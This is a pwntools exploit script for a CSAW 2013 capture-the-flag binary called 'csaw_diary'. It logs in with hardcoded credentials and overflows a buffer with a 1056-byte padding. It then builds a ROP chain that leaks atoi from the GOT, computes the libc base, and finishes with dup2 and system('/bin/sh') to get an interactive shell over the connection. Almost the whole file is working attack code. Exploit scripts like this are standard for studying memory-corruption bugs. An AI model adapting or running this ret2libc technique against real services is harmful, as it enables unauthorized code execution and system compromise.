#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch='i386')
exe = ELF('./csaw_diary')

host = args.HOST or '10.67.0.1'
#host = 'localhost'
port = int(args.PORT or 31420)
#port = 34266

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

io.sendafter(':', 'csaw2013')
io.sendafter(':', 'S1mplePWD')
io.sendafter(':', str(-1))

rop = ROP(exe)
rop.send(4, exe.got['atoi'], 4, 0)
rop.raw(0x08048EFE)
rop.raw(0xdeadbeef)
rop.raw(4)
rop.raw(-1)
log.info(rop.dump())

off = 1056
io.send('A' * off + rop.chain())

io.recvuntil(': ')
atoi_libc = u32(io.recv())
log.success("Leaked atoi: " + hex(atoi_libc))

#libc = ELF('/lib/libc.so.6')
libc = ELF('csaw_diary.so')
libc.address = atoi_libc - libc.symbols['atoi']

log.success("Leaked LIBC: " + hex(libc.address))

rop = ROP(libc)
rop.dup2(4, 0)
rop.dup2(4, 1)
rop.system(next(libc.search('/bin/sh\x00')))
log.info(rop.dump())
io.send('A' * off + rop.chain())

io.interactive()

